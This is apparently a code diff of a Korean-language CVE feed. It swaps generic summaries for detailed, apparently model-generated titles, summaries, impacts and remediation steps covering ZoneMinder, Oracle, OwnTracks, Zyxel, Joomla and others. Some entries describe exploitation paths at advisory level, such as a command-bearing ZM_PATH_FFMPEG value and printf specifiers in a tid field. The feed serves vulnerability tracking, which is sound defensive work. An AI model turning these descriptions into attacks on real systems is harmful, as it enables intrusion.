-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "HPE ArubaOS PAPI 인증 우회 취약점",
+      "summary_ko": "HPE ArubaOS(AOS) 10의 PAPI 프로토콜에 CWE-269 권한 관리 취약점이 있다. 영향 버전 10.8.0.0, 10.7.0.0, 10.4.0.0에서 비인증 원격 공격자가 기존 인증 통제를 우회할 수 있으며, CVSS 10.0(CRITICAL)으로 평가되었다. 공격에는 원격 네트워크 접근만 필요하며 인증이 필요하지 않아 위험도가 높으며, 성공 시 관리자 권한 획득, 시스템 구성 변경, 민감 데이터 접근·조작이 가능하다.",
+      "impact_ko": "공격자가 관리자 권한을 획득해 시스템 구성을 변경하고 민감 데이터에 접근하거나 조작할 수 있다.",
+      "remediation_ko": "① AOS-10 영향 버전 사용 여부를 확인하고 HPE 보안 업데이트를 적용한다. ② PAPI 프로토콜의 네트워크 노출을 제한하고 접근 통제를 강화한다. ③ 인증·구성 변경 로그를 모니터링해 비정상 접근을 탐지한다.",
       "cvss_score": 10.0,
       "severity": "CRITICAL",
       "epss_score": null,
@@ -3033,7 +3155,7 @@
       "description_orig": "Vulnerabilities in the PAPI protocol of AOS-10 could allow an unauthenticated remote attacker to circumvent existing authentication controls. Successful exploitation could allow an attacker to gain administrative access, modify system configurations, and access or manipulate sensitive data.",
       "published_at": "2026-11-18",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-129433",
@@ -3226,10 +3348,10 @@
     },
     {
       "cve_id": "CVE-2026-28273",
-      "title_ko": "Zoneminder 접근 제어 미흡 취약점",
-      "summary_ko": "CVE-2026-28273는 Zoneminder에서 확인된 접근 제어 미흡 취약점입니다. CVSS 9.9점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.8%(악용 위험 상위 42% 수준)입니다.",
-      "impact_ko": "권한 없는 사용자가 다른 사용자의 데이터나 관리 기능에 접근할 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 1.38.4 미만 버전이며, 자산 목록과 대조해 1.38.4 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "zoneminder 설정 권한검증 우회 취약점",
+      "summary_ko": "zoneminder 1.38.4 이전 버전에서 인증된 사용자가 /api/configs/edit/{name}.json 종단점을 통해 보호된 구성 설정을 수정할 수 있는 CWE-862 권한 부여 취약점이 있다. ConfigsController::edit()가 System=Edit 권한 요구를 강제하지 않고 시스템 변수 보호도 효과적이지 않다. 공격자는 ZM_PATH_FFMPEG에 명령 포함 값을 설정하고 프레임 추출을 요청해 web/views/image.php 또는 web/includes/Event.php의 exec() 싱크를 트리거할 수 있다.",
+      "impact_ko": "웹 서버 사용자 권한으로 임의 명령 실행이 가능해 비공개 카메라 영상, 녹화, 데이터베이스 데이터가 노출되거나 지속성이 확보될 수 있다.",
+      "remediation_ko": "① 입력된 영향 버전 범위 사용 여부를 확인하고 1.38.4로 업데이트한다. ② 구성 편집 종단점의 System=Edit 권한 검증과 시스템 변수 보호를 강화한다. ③ 웹 서버 권한을 최소화하고 카메라·녹화·데이터베이스 접근 및 명령 실행 흔적을 모니터링한다.",
       "cvss_score": 9.9,
       "severity": "CRITICAL",
       "epss_score": 0.00836,
@@ -3274,7 +3396,7 @@
       "description_orig": "ZoneMinder is a free, open source closed-circuit television software application. Prior to 1.38.4, any authenticated user can use the /api/configs/edit/{name}.json endpoint to modify protected configuration settings because ConfigsController::edit() does not enforce the System=Edit authorization requirement and its system-variable protection is ineffective. An attacker can set ZM_PATH_FFMPEG to a command-bearing value and trigger an exec() sink in web/views/image.php or web/includes/Event.php by requesting frame extraction. This permits arbitrary command execution with the privileges of the web server user and can expose private camera feeds, recordings, and database data or establish persistence. This issue is fixed in version 1.38.4.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-129250",
@@ -3443,10 +3565,10 @@
     },
     {
       "cve_id": "CVE-2026-130587",
-      "title_ko": "OpenFunction 접근 제어 미흡 취약점",
-      "summary_ko": "CVE-2026-130587는 OpenFunction에서 확인된 접근 제어 미흡 취약점입니다. CVSS 9.9점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 55% 수준)입니다.",
-      "impact_ko": "권한 없는 사용자가 다른 사용자의 데이터나 관리 기능에 접근할 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "OpenFunction 권한 상승 취약점",
+      "summary_ko": "OpenFunction 1.2.0까지 Function 및 Serving 리소스의 PodSpec 템플릿이 제한 없이 허용되어, 네임스페이스 테넌트가 특권 포드 생성 조건을 조작할 수 있는 취약점이다. Function 또는 Serving 생성 권한만 가진 공격자가 privileged, hostNetwork, hostPID, hostPath 등을 설정하면 워커 노드 루트 파일시스템 마운트 및 노드 접근 권한 상승으로 이어질 수 있다.",
+      "impact_ko": "공격 성공 시 테넌트 경계를 넘어 워커 노드 접근 권한을 획득할 수 있어 클러스터 내 데이터 노출과 측면 이동 위험이 커진다.",
+      "remediation_ko": "① Function·Serving 생성 권한을 최소화하고 RBAC를 점검한다. ② PodSpec 템플릿에서 privileged, hostNetwork, hostPID, hostPath 등 위험 필드를 차단하는 정책을 적용한다. ③ 관리 엔드포인트의 인터넷 노출 여부를 확인하고 공급사 패치 정보를 확인해 적용한다.",
       "cvss_score": 9.9,
       "severity": "CRITICAL",
       "epss_score": 0.00523,
@@ -3487,14 +3609,14 @@
       "description_orig": "OpenFunction through 1.2.0 contains a privilege escalation vulnerability that allows namespace tenants to create privileged host-access pods by supplying unrestricted PodSpec templates in Function and Serving resources. Attackers with only Function or Serving create permissions can set privileged, hostNetwork, hostPID, or hostPath fields to mount the worker node's root filesystem and escalate to node access.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114980",
-      "title_ko": "Oracle Corporation Oracle AutoVue 접근 제어 미흡 취약점",
-      "summary_ko": "CVE-2026-114980는 Oracle Corporation Oracle AutoVue에서 확인된 접근 제어 미흡 취약점입니다. CVSS 9.9점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 58% 수준)입니다.",
-      "impact_ko": "권한 없는 사용자가 다른 사용자의 데이터나 관리 기능에 접근할 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle AutoVue 접근 통제 취약점",
+      "summary_ko": "Oracle AutoVue 21.1.0에서 HTTP를 통한 네트워크 접근이 가능한 낮은 권한 공격자가 제품을 공격할 수 있는 접근 통제 취약점이 보고되었다. CVSS 3.1 기준 9.9(CRITICAL)이며 기밀성·무결성·가용성 영향이 높고, 범위 변경으로 추가 제품에도 영향을 줄 수 있다.",
+      "impact_ko": "성공 시 Oracle AutoVue 장악으로 이어질 수 있으며, 추가 제품 영향 가능성 때문에 연계 시스템 위험도 고려해야 한다.",
+      "remediation_ko": "① 인터넷 노출 AutoVue 인스턴스와 HTTP 서비스 우선 점검·접근 제한. ② Oracle 보안 패치 및 완화 조치를 공식 정보로 확인해 적용. ③ 낮은 권한 계정 권한과 접근 로그를 점검하고 비정상 접근을 모니터링.",
       "cvss_score": 9.9,
       "severity": "CRITICAL",
       "epss_score": 0.00479,
@@ -3523,14 +3645,14 @@
       "description_orig": "Vulnerability in the Oracle AutoVue product of Oracle Supply Chain (component: Security Related Issues). The supported version that is affected is 21.1.0. Easily exploitable vulnerability allows low privileged attacker with network access via HTTP to compromise Oracle AutoVue. While the vulnerability is in Oracle AutoVue, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of Oracle AutoVue. CVSS 3.1 Base Score 9.9 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114978",
-      "title_ko": "Oracle Corporation Oracle Hyperion Financial Management 접근 제어 미흡 취약점",
-      "summary_ko": "CVE-2026-114978는 Oracle Corporation Oracle Hyperion Financial Management에서 확인된 접근 제어 미흡 취약점입니다. CVSS 9.9점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 58% 수준)입니다.",
-      "impact_ko": "권한 없는 사용자가 다른 사용자의 데이터나 관리 기능에 접근할 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Hyperion Financial Management 접근 통제 취약점",
+      "summary_ko": "Oracle Hyperion Financial Management 11.2.26.0.000에서 HTTP 기반 네트워크 접근이 가능한 낮은 권한 공격자가 제품을 공격할 수 있는 접근 통제 취약점이 있다. CVSS 3.1 9.9(CRITICAL)로 기밀성·무결성·가용성 영향이 높으며 범위 변경 시 추가 제품에도 영향 가능하다.",
+      "impact_ko": "성공 시 제품 장악과 민감 정보 유출·변조·서비스 중단 우려가 있다.",
+      "remediation_ko": "① 인터넷 노출 인스턴스와 HTTP 접근 경로를 우선 점검·제한한다. ② Oracle 공식 보안 패치 및 완화 조치를 확인해 적용한다. ③ 낮은 권한 계정 권한과 접근 로그를 점검하고 비정상 접근을 모니터링한다.",
       "cvss_score": 9.9,
       "severity": "CRITICAL",
       "epss_score": 0.00479,
@@ -3559,14 +3681,14 @@
       "description_orig": "Vulnerability in the Oracle Hyperion Financial Management product of Oracle Hyperion (component: Security). The supported version that is affected is 11.2.26.0.000. Easily exploitable vulnerability allows low privileged attacker with network access via HTTP to compromise Oracle Hyperion Financial Management. While the vulnerability is in Oracle Hyperion Financial Management, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of Oracle Hyperion Financial Management. CVSS 3.1 Base Score 9.9 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114848",
-      "title_ko": "Oracle Corporation Oracle Database Server 접근 제어 미흡 취약점",
-      "summary_ko": "CVE-2026-114848는 Oracle Corporation Oracle Database Server에서 확인된 접근 제어 미흡 취약점입니다. CVSS 9.9점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 58% 수준)입니다.",
-      "impact_ko": "권한 없는 사용자가 다른 사용자의 데이터나 관리 기능에 접근할 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Database Server Oracle Text 취약점",
+      "summary_ko": "Oracle Database Server의 Oracle Text 구성요소에서 Create Session 권한을 가진 낮은 권한 공격자가 Oracle Net을 통해 네트워크로 공격할 수 있는 접근 통제 취약점이 있다. 영향 버전은 19.3-19.33, 21.3-21.24, 23.4.0-23.26.3이며 CVSS 3.1 9.9(CRITICAL)로 기밀성·무결성·가용성 영향이 높다.",
+      "impact_ko": "성공 시 Oracle Text 장악과 데이터베이스 정보 유출·변조·서비스 중단으로 이어질 수 있고 범위 변경으로 추가 제품 영향 가능성이 있다.",
+      "remediation_ko": "① Oracle Net 노출과 Create Session 계정 권한을 최소화한다. ② Oracle 공식 보안 패치를 확인해 적용한다. ③ 데이터베이스 접근·계정 활동을 모니터링하고 인터넷 노출 자산을 우선 점검한다.",
       "cvss_score": 9.9,
       "severity": "CRITICAL",
       "epss_score": 0.00479,
@@ -3595,14 +3717,14 @@
       "description_orig": "Vulnerability in the Oracle Text component of Oracle Database Server. Supported versions that are affected are 19.3-19.33, 21.3-21.24 and 23.4.0-23.26.3. Easily exploitable vulnerability allows low privileged attacker having Create Session privilege with network access via Oracle Net to compromise Oracle Text. While the vulnerability is in Oracle Text, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of Oracle Text. CVSS 3.1 Base Score 9.9 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114822",
-      "title_ko": "Oracle Corporation Oracle Database Server 접근 제어 미흡 취약점",
-      "summary_ko": "CVE-2026-114822는 Oracle Corporation Oracle Database Server에서 확인된 접근 제어 미흡 취약점입니다. CVSS 9.9점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 58% 수준)입니다.",
-      "impact_ko": "권한 없는 사용자가 다른 사용자의 데이터나 관리 기능에 접근할 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Database Server RDBMS 구성요소 취약점",
+      "summary_ko": "Oracle Database Server의 RDBMS 구성요소에 취약점이 있으며, 영향 버전은 23.4.0-23.26.4입니다. Create Session 권한을 가진 낮은 권한 공격자가 Oracle Net을 통한 네트워크 접근으로 RDBMS를 침해할 수 있고, 범위 변경으로 추가 제품에도 영향을 줄 수 있습니다. CVSS 3.1 기본 점수는 9.9(CRITICAL)입니다.",
+      "impact_ko": "성공 시 RDBMS 장악으로 이어질 수 있으며, 기밀성·무결성·가용성에 높은 영향을 줄 수 있습니다.",
+      "remediation_ko": "① Oracle 보안 권고에 따라 영향 버전의 패치를 적용하고, ② Oracle Net 접근 경로와 Create Session 보유 계정을 최소화하며, ③ 인터넷 노출 및 불필요하게 넓은 네트워크 접근이 가능한 데이터베이스를 우선 점검합니다.",
       "cvss_score": 9.9,
       "severity": "CRITICAL",
       "epss_score": 0.00479,
@@ -3631,14 +3753,14 @@
       "description_orig": "Vulnerability in the RDBMS component of Oracle Database Server. Supported versions that are affected are 23.4.0-23.26.4. Easily exploitable vulnerability allows low privileged attacker having Create Session privilege with network access via Oracle Net to compromise RDBMS. While the vulnerability is in RDBMS, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of RDBMS. CVSS 3.1 Base Score 9.9 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-114819",
-      "title_ko": "Oracle Corporation Oracle Database Server 접근 제어 미흡 취약점",
-      "summary_ko": "CVE-2026-114819는 Oracle Corporation Oracle Database Server에서 확인된 접근 제어 미흡 취약점입니다. CVSS 9.9점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.5%(악용 위험 상위 58% 수준)입니다.",
-      "impact_ko": "권한 없는 사용자가 다른 사용자의 데이터나 관리 기능에 접근할 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Oracle Database Server Oracle Text 취약점",
+      "summary_ko": "Oracle Database Server의 Oracle Text 구성요소에 취약점이 있으며, 영향 버전은 19.3-19.32, 21.3-21.24, 23.4.0-23.26.3입니다. Create Session 권한을 가진 낮은 권한 공격자가 Oracle Net을 통한 네트워크 접근으로 Oracle Text를 침해할 수 있고, 범위 변경으로 추가 제품에도 영향을 줄 수 있습니다. CVSS 3.1 기본 점수는 9.9(CRITICAL)입니다.",
+      "impact_ko": "성공 시 Oracle Text 장악으로 이어질 수 있으며, 기밀성·무결성·가용성에 높은 영향을 줄 수 있습니다.",
+      "remediation_ko": "① Oracle 보안 권고에 따라 영향 버전의 패치를 적용하고, ② Oracle Net 접근 경로와 Create Session 보유 계정을 최소화하며, ③ 인터넷 노출 및 불필요하게 넓은 네트워크 접근이 가능한 데이터베이스를 우선 점검합니다.",
       "cvss_score": 9.9,
       "severity": "CRITICAL",
       "epss_score": 0.00479,
@@ -3667,7 +3789,7 @@
       "description_orig": "Vulnerability in the Oracle Text component of Oracle Database Server. Supported versions that are affected are 19.3-19.32, 21.3-21.24 and 23.4.0-23.26.3. Easily exploitable vulnerability allows low privileged attacker having Create Session privilege with network access via Oracle Net to compromise Oracle Text. While the vulnerability is in Oracle Text, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of Oracle Text. CVSS 3.1 Base Score 9.9 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H).",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-129453",
@@ -3812,10 +3934,10 @@
     },
     {
       "cve_id": "CVE-2026-131852",
-      "title_ko": "OwnTracks Recorder 보안 취약점",
-      "summary_ko": "CVE-2026-131852는 OwnTracks Recorder에서 확인된 보안 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.8%(악용 위험 상위 42% 수준)입니다.",
-      "impact_ko": "취약점이 악용되면 시스템 기밀성·무결성이 훼손될 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 1.0.5 미만 버전이며, 자산 목록과 대조해 1.0.5 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "OwnTracks Recorder 포맷 문자열 취약점",
+      "summary_ko": "OwnTracks Recorder 1.0.5 미만에서 json_response() 및 관련 출력 함수의 포맷 문자열 취약점이 확인된다. 인증되지 않은 공격자가 tid 값에 printf 지정자를 넣어 POST /pub 또는 MQTT로 위치를 게시한 뒤 GET /api/0/last에서 다시 읽으면 주소 유출과 메모리 쓰기가 가능하다. CVSS 9.8(CRITICAL)로 평가된다.",
+      "impact_ko": "공격 성공 시 인증 없이 코드 실행, 메모리 주소 유출, 메모리 쓰기 등이 가능해 서비스 장악으로 이어질 수 있다.",
+      "remediation_ko": "① 영향 버전(<1.0.5) 사용 여부를 확인하고 공급사 패치에 따라 1.0.5 이상으로 업데이트한다. ② POST /pub, MQTT, GET /api/0/last 등 관련 인터페이스의 인터넷 노출을 줄이고 접근 통제를 적용한다. ③ 비정상 tid 값과 포맷 지정자 사용, 예기치 않은 출력·메모리 관련 징후를 모니터링한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": 0.00837,
@@ -3860,7 +3982,7 @@
       "description_orig": "OwnTracks Recorder before 1.0.5 contains a format string vulnerability in json_response() and related output functions that allows unauthenticated attackers to execute code by storing a malicious tid value. Attackers can publish locations via POST /pub or MQTT with printf specifiers in tid, then read them back through GET /api/0/last to leak addresses and write memory.",
       "published_at": "2026-11-18",
       "updated_at": "2026-11-19 08:11:37 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-82504",
@@ -4121,10 +4243,10 @@
     },
     {
       "cve_id": "CVE-2026-79614",
-      "title_ko": "Zyxel DX3301-T0 firmware 메모리 손상 취약점",
-      "summary_ko": "CVE-2026-79614는 Zyxel DX3301-T0 firmware에서 확인된 메모리 손상 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.4%(악용 위험 상위 61% 수준)입니다.",
-      "impact_ko": "메모리 오류를 악용해 서비스가 중단되거나 원격 코드 실행으로 이어질 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Zyxel DX3301-T0/EX3301-T0 펌웨어 OOB 쓰기 취약점",
+      "summary_ko": "Zyxel DX3301-T0 및 EX3301-T0 펌웨어 5.50(ABVY.8.3)C0 이하에서 libclinkc.so에 OOB 쓰기 취약점(CWE-787)이 존재한다. 인증되지 않은 공격자가 조작된 HTTP 요청을 보내면 권한 상승 및 임의 명령 실행이 가능할 수 있다. 해당 장비는 WAN 접근이 기본 비활성화되어 있으나, 접근 가능한 경로가 있으면 위험이 커진다.",
+      "impact_ko": "공격 성공 시 공격자가 권한을 상승시키고 임의 명령을 실행할 가능성이 있다.",
+      "remediation_ko": "① 영향 펌웨어(5.50(ABVY.8.3)C0 이하) 사용 여부를 확인하고 제조사 패치/업데이트를 적용한다. ② 인터넷 노출 자산과 WAN/HTTP 접근 경로를 우선 점검해 불필요 서비스를 제한한다. ③ 기본 WAN 비활성 설정을 유지하고 비정상 HTTP 요청을 모니터링한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": 0.00444,
@@ -4154,7 +4276,7 @@
       "description_orig": "An out-of-bounds write vulnerability in “libclinkc.so” in Zyxel DX3301-T0/EX3301-T0 firmware versions through 5.50(ABVY.8.3)C0 could allow an unauthenticated attacker to elevate privileges and potentially execute arbitrary commands by sending a crafted HTTP request. WAN access is disabled by default on these devices.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-125795",
@@ -4362,10 +4484,10 @@
     },
     {
       "cve_id": "CVE-2026-122662",
-      "title_ko": "Barn2 Plugins Document Library Pro 역직렬화 취약점",
-      "summary_ko": "CVE-2026-122662는 Barn2 Plugins Document Library Pro에서 확인된 역직렬화 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.3%(악용 위험 상위 75% 수준)입니다.",
-      "impact_ko": "신뢰할 수 없는 데이터가 역직렬화되면서 원격 코드 실행으로 이어질 수 있습니다.",
-      "remediation_ko": "① 영향 범위는 4.2.2 미만 버전이며, 자산 목록과 대조해 4.2.2 이상 버전으로 업데이트하면 해결됩니다. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Barn2 Document Library Pro 객체 주입 취약점",
+      "summary_ko": "Barn2 Plugins Document Library Pro의 document-library-pro에서 신뢰할 수 없는 데이터 역직렬화 취약점(CWE-502)이 확인되었습니다. 영향 버전은 4.2.2 이전으로 명시되어 있으며, 객체 주입으로 이어질 수 있습니다. 공격자가 조작된 직렬화 데이터를 역직렬화하도록 유도하면 애플리케이션 객체 무결성과 처리 흐름이 침해될 수 있습니다.",
+      "impact_ko": "CVSS 9.8(CRITICAL)로 평가되며, 객체 주입이 악용되면 애플리케이션 데이터나 객체 상태가 조작될 수 있습니다.",
+      "remediation_ko": "① 4.2.2 이전 영향 버전 여부를 확인하고 벤더 권고에 따라 업데이트 ② 문서 라이브러리 입력·역직렬화 경로를 점검하고 신뢰할 수 없는 데이터 처리 차단 ③ 인터넷 노출 해당 플러그인 자산 우선 점검 및 모니터링 강화",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": 0.00313,
@@ -4394,14 +4516,14 @@
       "description_orig": "Deserialization of Untrusted Data vulnerability in Barn2 Plugins Document Library Pro document-library-pro allows Object Injection.This issue affects Document Library Pro: from n/a before 4.2.2.",
       "published_at": "2026-11-15",
       "updated_at": "2026-11-17 13:30:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-107904",
-      "title_ko": "Valorapps.com Easy File Uploader extension for Joomla 파일 업로드 취약점",
-      "summary_ko": "CVE-2026-107904는 Valorapps.com Easy File Uploader extension for Joomla에서 확인된 파일 업로드 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.3%(악용 위험 상위 83% 수준)입니다.",
-      "impact_ko": "악성 파일 업로드를 통해 웹셸 실행이나 서버 장악이 가능합니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "Joomla Easy File Uploader 무인증 원격 코드 실행 취약점",
+      "summary_ko": "Joomla 확장인 valorapps.com Easy File Uploader의 1.0.0-2.9.6 버전이 영향을 받습니다. 인증되지 않은 원격 공격자가 단일 multipart POST 요청으로 Joomla 웹 루트에 PHP 실행 파일을 업로드할 수 있으며, 자격 증명과 CSRF 토큰이 필요하지 않습니다. 해당 취약점은 CVSS 9.8(CRITICAL)로 평가되었습니다.",
+      "impact_ko": "공격 성공 시 원격 코드 실행으로 이어질 수 있어 Joomla 사이트와 관련 서버의 기밀성·무결성·가용성에 영향을 줄 수 있습니다.",
+      "remediation_ko": "① 해당 확장을 2.9.7 이상으로 업데이트하고, ② 인터넷에 노출된 Joomla 자산과 업로드 경로를 우선 점검하며, ③ 불필요한 파일 업로드 기능과 웹 루트 쓰기 권한을 제한합니다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": 0.00255,
@@ -4430,14 +4552,14 @@
       "description_orig": "Joomla Extension - valorapps.com - Unauthenticated Remote Code Execution in Easy File Uploader < 2.9.7 - An unauthenticated remote attacker can upload a PHP-executable file to the Joomla web root with a single multipart POST request, requiring no credentials and no CSRF token.",
       "published_at": "2026-11-17",
       "updated_at": "2026-11-18 06:40:47 KST",
-      "analyzed_by": "fallback:budget"
+      "analyzed_by": "exaone"
     },
     {
       "cve_id": "CVE-2026-129892",
-      "title_ko": "영향 제품 원격 코드 실행(RCE) 취약점",
-      "summary_ko": "CVE-2026-129892는 영향 제품에서 확인된 원격 코드 실행(RCE) 취약점입니다. CVSS 9.8점(치명적)으로 평가됐습니다. 향후 30일 내 악용될 확률(EPSS)은 0.2%(악용 위험 상위 86% 수준)입니다.",
-      "impact_ko": "공격자가 원격에서 임의 코드를 실행해 서버를 완전히 장악하고, 내부 데이터 유출·추가 침해의 발판으로 삼을 수 있습니다.",
-      "remediation_ko": "① 영향받는 제품·버전을 자산 목록에서 확인하고, 벤더 보안 공지의 수정 버전으로 업데이트하세요. ② 인터넷에 직접 노출된 서비스는 접근 제어·WAF 차단 등 임시 완화 조치를 함께 적용하고, 침해 흔적 점검을 병행하세요.",
+      "title_ko": "IO::Socket::SSL::PublicSuffix 코드 주입 취약점",
+      "summary_ko": "Perl용 IO::Socket::SSL::PublicSuffix 2.099 이하 버전은 update_self_from_url이 모듈 소스를 재작성할 때 가져온 목록 라인을 통해 코드 주입을 허용한다. 가져온 목록에 END_BUILTIN_DATA 라인이 있으면 내장 데이터 heredoc이 종료되고 이후 라인들이 Perl로 실행되며, 파일을 재설치할 때까지 IO::Socket::SSL을 로드하는 프로세스에 영향을 줄 수 있다.",
+      "impact_ko": "성공 시 영향받는 프로세스에서 임의 Perl 코드 실행이 가능해 데이터 유출·변조, 서비스 중단 등 침해로 이어질 수 있다.",
+      "remediation_ko": "① CPAN/유지보수자의 최신 수정 버전을 확인해 업데이트하고, ② update_self_from_url 등 원격 목록 기반 갱신을 제한하거나 신뢰된 출처로 한정하며, ③ 영향받는 Perl 프로세스와 자산을 점검한다.",
       "cvss_score": 9.8,
       "severity": "CRITICAL",
       "epss_score": 0.00232,
@@ -4447,9 +4569,11 @@
       "kev_due_date": "",
       "kev_required_action": "",
       "kev_ransomware": "",
-      "vendor": "",
-      "product": "",
